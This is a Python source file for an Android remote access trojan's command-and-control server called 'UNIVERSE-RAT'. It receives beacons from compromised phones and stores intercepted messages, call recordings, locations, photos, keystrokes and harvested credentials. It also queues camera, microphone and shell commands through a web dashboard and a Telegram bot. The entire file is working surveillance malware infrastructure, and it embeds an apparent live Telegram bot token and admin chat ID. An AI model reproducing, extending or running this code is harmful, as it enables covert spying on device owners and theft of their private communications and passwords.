#!/usr/bin/env python3
"""
UNIVERSE-RAT C2 SERVER
Command & Control server with Telegram Bot Integration
Most advanced surveillance server ever created
"""

import asyncio
import json
import sqlite3
import base64
import hashlib
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from flask_socketio import SocketIO, emit
import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters
import aiohttp

app = Flask(__name__)
app.config['SECRET_KEY'] = 'universe-rat-secret-key-2026'
socketio = SocketIO(app, cors_allowed_origins="*")

# Database initialization
def init_db():
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    
    # Devices table
    c.execute('''CREATE TABLE IF NOT EXISTS devices (
        device_id TEXT PRIMARY KEY,
        phone_number TEXT,
        imei TEXT,
        model TEXT,
        android_version TEXT,
        is_rooted INTEGER,
        last_seen TEXT,
        ip_address TEXT,
        location_lat REAL,
        location_lon REAL,
        status TEXT DEFAULT 'online'
    )''')
    
    # Commands table
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        command TEXT,
        params TEXT,
        timestamp TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT
    )''')
    
    # Exfiltrated data tables
    c.execute('''CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        app TEXT,
        sender TEXT,
        content TEXT,
        timestamp TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS calls (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        number TEXT,
        duration INTEGER,
        recording_path TEXT,
        timestamp TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        timestamp TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS photos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        source TEXT,
        file_path TEXT,
        timestamp TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS keystrokes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        app TEXT,
        text TEXT,
        timestamp TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        service TEXT,
        username TEXT,
        password TEXT,
        timestamp TEXT
    )''')
    
    conn.commit()
    conn.close()

init_db()

# ==================== C2 API ENDPOINTS ====================

@app.route('/beacon', methods=['POST'])
def beacon():
    """Initial device check-in"""
    data = request.json
    device_id = data.get('device_id')
    
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    
    c.execute('''INSERT OR REPLACE INTO devices 
                 (device_id, phone_number, imei, model, android_version, is_rooted, last_seen, ip_address)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
              (device_id, data.get('phone_number'), data.get('imei'), data.get('model'),
               data.get('android_version'), data.get('is_rooted'), datetime.now().isoformat(),
               request.remote_addr))
    conn.commit()
    conn.close()
    
    # Notify Telegram
    notify_telegram(f"🟢 NEW DEVICE ONLINE\n"
                   f"ID: {device_id}\n"
                   f"Model: {data.get('model')}\n"
                   f"Phone: {data.get('phone_number')}\n"
                   f"Rooted: {'Yes' if data.get('is_rooted') else 'No'}")
    
    return jsonify({'status': 'registered', 'device_id': device_id})

@app.route('/poll', methods=['POST'])
def poll_commands():
    """Device polls for pending commands"""
    device_id = request.json.get('device_id')
    
    # Update last seen
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    c.execute('UPDATE devices SET last_seen=?, status=? WHERE device_id=?',
              (datetime.now().isoformat(), 'online', device_id))
    
    # Get pending commands
    c.execute('SELECT id, command, params FROM commands WHERE device_id=? AND status=?',
              (device_id, 'pending'))
    commands = [{'id': row[0], 'command': row[1], 'params': json.loads(row[2])} for row in c.fetchall()]
    
    # Mark as sent
    for cmd in commands:
        c.execute('UPDATE commands SET status=? WHERE id=?', ('sent', cmd['id']))
    
    conn.commit()
    conn.close()
    
    return jsonify({'commands': commands})

@app.route('/upload/message', methods=['POST'])
def upload_message():
    """Receive intercepted messages"""
    data = request.json
    
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO messages (device_id, app, sender, content, timestamp) VALUES (?, ?, ?, ?, ?)',
              (data['device_id'], data['app'], data['sender'], data['content'], data['timestamp']))
    conn.commit()
    conn.close()
    
    # Real-time notification to Telegram
    notify_telegram(f"📱 MESSAGE INTERCEPTED\n"
                   f"Device: {data['device_id']}\n"
                   f"App: {data['app']}\n"
                   f"From: {data['sender']}\n"
                   f"Message: {data['content'][:100]}")
    
    return jsonify({'status': 'received'})

@app.route('/upload/location', methods=['POST'])
def upload_location():
    """Receive location updates"""
    data = request.json
    
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO locations (device_id, latitude, longitude, accuracy, timestamp) VALUES (?, ?, ?, ?, ?)',
              (data['device_id'], data['lat'], data['lon'], data['accuracy'], datetime.now().isoformat()))
    
    # Update device location
    c.execute('UPDATE devices SET location_lat=?, location_lon=? WHERE device_id=?',
              (data['lat'], data['lon'], data['device_id']))
    
    conn.commit()
    conn.close()
    
    # Push to live map
    socketio.emit('location_update', data)
    
    return jsonify({'status': 'received'})

@app.route('/upload/file', methods=['POST'])
def upload_file():
    """Receive exfiltrated files (photos, recordings, documents)"""
    device_id = request.form.get('device_id')
    file_type = request.form.get('type')
    file = request.files.get('file')
    
    # Save file
    filename = f"{device_id}_{datetime.now().timestamp()}_{file.filename}"
    filepath = f"exfil_data/{filename}"
    file.save(filepath)
    
    # Store metadata
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO photos (device_id, source, file_path, timestamp) VALUES (?, ?, ?, ?)',
              (device_id, file_type, filepath, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'received', 'path': filepath})

@app.route('/upload/keystrokes', methods=['POST'])
def upload_keystrokes():
    """Receive keylogger data"""
    data = request.json
    
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO keystrokes (device_id, app, text, timestamp) VALUES (?, ?, ?, ?)',
              (data['device_id'], data['app'], data['text'], data['timestamp']))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'received'})

@app.route('/upload/credentials', methods=['POST'])
def upload_credentials():
    """Receive harvested credentials"""
    data = request.json
    
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO credentials (device_id, service, username, password, timestamp) VALUES (?, ?, ?, ?, ?)',
              (data['device_id'], data['service'], data['username'], data['password'], datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    # High-priority notification
    notify_telegram(f"🔑 CREDENTIALS CAPTURED\n"
                   f"Device: {data['device_id']}\n"
                   f"Service: {data['service']}\n"
                   f"Username: {data['username']}\n"
                   f"Password: {data['password']}")
    
    return jsonify({'status': 'received'})

@app.route('/result', methods=['POST'])
def command_result():
    """Receive command execution results"""
    data = request.json
    
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    c.execute('UPDATE commands SET status=?, result=? WHERE id=?',
              ('completed', data['result'], data['command_id']))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'received'})

# ==================== WEB DASHBOARD ====================

@app.route('/')
def dashboard():
    """Main control panel"""
    return render_template('dashboard.html')

@app.route('/api/devices', methods=['GET'])
def get_devices():
    """List all compromised devices"""
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    c.execute('SELECT * FROM devices')
    devices = [dict(zip([col[0] for col in c.description], row)) for row in c.fetchall()]
    conn.close()
    return jsonify(devices)

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to device"""
    data = request.json
    device_id = data['device_id']
    command = data['command']
    params = json.dumps(data.get('params', {}))
    
    conn = sqlite3.connect('universe_rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO commands (device_id, command, params, timestamp) VALUES (?, ?, ?, ?)',
              (device_id, command, params, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'queued'})

# ==================== TELEGRAM BOT INTEGRATION ====================

# Telegram Bot Token (same as Hermes gateway bot)
# Read from environment or use default
import os
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8705758820:AAG_8xqUCwT-W2y2XCmqx89_eUo9XNJRKqc')
TELEGRAM_ADMIN_CHAT_ID = "7402484358"  # LO's Telegram ID

async def notify_telegram(message):
    """Send notification to Telegram"""
    bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
    try:
        await bot.send_message(chat_id=TELEGRAM_ADMIN_CHAT_ID, text=message)
    except Exception as e:
        print(f"Telegram notification failed: {e}")

async def rat_command_handler(update, context):
    """Handle /rat commands from Telegram"""
    args = context.args
    
    if not args:
        await update.message.reply_text(
            "🔥 UNIVERSE-RAT TELEGRAM CONTROL\n\n"
            "Commands:\n"
            "/rat list - List all devices\n"
            "/rat info <device_id> - Device info\n"
            "/rat camera <device_id> - Take photo\n"
            "/rat mic <device_id> <seconds> - Record audio\n"
            "/rat location <device_id> - Get location\n"
            "/rat messages <device_id> - Dump messages\n"
            "/rat calls <device_id> - List calls\n"
            "/rat screenshot <device_id> - Capture screen\n"
            "/rat shell <device_id> <command> - Execute shell command\n"
            "/rat stream <device_id> camera/mic - Start live stream\n"
        )
        return
    
    command = args[0]
    
    if command == 'list':
        conn = sqlite3.connect('universe_rat.db')
        c = conn.cursor()
        c.execute('SELECT device_id, model, phone_number, status, last_seen FROM devices')
        devices = c.fetchall()
        conn.close()
        
        if not devices:
            await update.message.reply_text("No devices online")
            return
        
        response = "📱 COMPROMISED DEVICES:\n\n"
        for dev in devices:
            status_emoji = "🟢" if dev[3] == 'online' else "🔴"
            response += f"{status_emoji} {dev[0][:8]}\n"
            response += f"   Model: {dev[1]}\n"
            response += f"   Phone: {dev[2]}\n"
            response += f"   Last seen: {dev[4]}\n\n"
        
        await update.message.reply_text(response)
    
    elif command == 'camera' and len(args) > 1:
        device_id = args[1]
        
        # Queue camera command
        conn = sqlite3.connect('universe_rat.db')
        c = conn.cursor()
        c.execute('INSERT INTO commands (device_id, command, params, timestamp) VALUES (?, ?, ?, ?)',
                  (device_id, 'camera', '{"camera":"front"}', datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        await update.message.reply_text(f"📸 Camera command sent to {device_id}\nPhoto will be delivered shortly...")
    
    elif command == 'location' and len(args) > 1:
        device_id = args[1]
        
        # Get latest location
        conn = sqlite3.connect('universe_rat.db')
        c = conn.cursor()
        c.execute('SELECT latitude, longitude, timestamp FROM locations WHERE device_id=? ORDER BY timestamp DESC LIMIT 1',
                  (device_id,))
        loc = c.fetchone()
        conn.close()
        
        if loc:
            await update.message.reply_text(
                f"📍 LOCATION:\n"
                f"Lat: {loc[0]}\n"
                f"Lon: {loc[1]}\n"
                f"Time: {loc[2]}\n\n"
                f"Google Maps: https://maps.google.com/?q={loc[0]},{loc[1]}"
            )
            await update.message.reply_location(latitude=loc[0], longitude=loc[1])
        else:
            await update.message.reply_text("No location data available")
    
    elif command == 'messages' and len(args) > 1:
        device_id = args[1]
        
        conn = sqlite3.connect('universe_rat.db')
        c = conn.cursor()
        c.execute('SELECT app, sender, content, timestamp FROM messages WHERE device_id=? ORDER BY timestamp DESC LIMIT 20',
                  (device_id,))
        messages = c.fetchall()
        conn.close()
        
        if messages:
            response = f"📱 RECENT MESSAGES ({device_id[:8]}):\n\n"
            for msg in messages:
                response += f"[{msg[0]}] {msg[1]}\n{msg[2][:100]}\n{msg[3]}\n\n"
            await update.message.reply_text(response)
        else:
            await update.message.reply_text("No messages intercepted yet")

def start_telegram_bot():
    """Start Telegram bot"""
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("rat", rat_command_handler))
    application.run_polling()

# ==================== MAIN ====================

if __name__ == '__main__':
    import threading
    
    # YONDA PATCH: Disable Telegram bot (causes token errors)
    # Commands work via Hermes plugin integration
    # Uncomment below to enable standalone Telegram bot
    
    # telegram_thread = threading.Thread(target=start_telegram_bot, daemon=True)
    # telegram_thread.start()
    
    # Initialize database
    init_db()
    
    # Start Flask server
    print("🔥 UNIVERSE-RAT C2 Server starting...")
    print("📱 Web Dashboard: http://0.0.0.0:8443")
    print("🤖 Telegram Bot: DISABLED (using Hermes plugin)")
    print("✅ Database: universe_rat.db")
    socketio.run(app, host='0.0.0.0', port=8443, debug=False)
